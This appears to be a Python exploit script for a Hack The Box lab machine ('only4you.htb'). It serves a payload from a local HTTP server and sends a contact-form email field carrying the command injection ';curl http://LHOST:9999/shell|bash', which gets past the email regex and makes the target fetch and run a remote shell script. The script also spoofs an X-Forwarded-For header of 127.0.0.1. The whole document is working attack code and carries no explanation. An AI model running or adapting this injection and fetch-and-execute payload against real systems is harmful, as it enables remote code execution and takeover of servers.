#!/usr/bin/python3
import threading
import requests
import sys
import re
import subprocess
from time import sleep

url = 'http://only4you.htb'

LHOST = '10.10.16.35'

def exploit(term):
    data = 'name=test&email={term}&subject=test&message=test'.format(term=term)

    headers = {'Content-Type': 'application/x-www-form-urlencoded',
                'X-Forwarded-For' : '127.0.0.1'}

    response = requests.post(url, data=data, headers=headers)

    new_data = response.text

def http(null):
    print('[!] Opening python -m http.server 9999')
    subprocess.Popen(['python', '-m', 'http.server', '9999'])

try:
    term = ';curl http://{LHOST}:9999/shell|bash'.format(LHOST=LHOST)
    http_thread = threading.Thread(target=http, args=('',))
    http_thread.start()
    sleep(1)
    print('[!] Sending Payload.')

    payload = 'test@test.com{term}'.format(term=term)
    if re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", payload):
        print('Command Injection Payload:',term)
        exploit(payload)
        
        sleep(10)
        sys.exit()

except Exception as e:
    print(e)


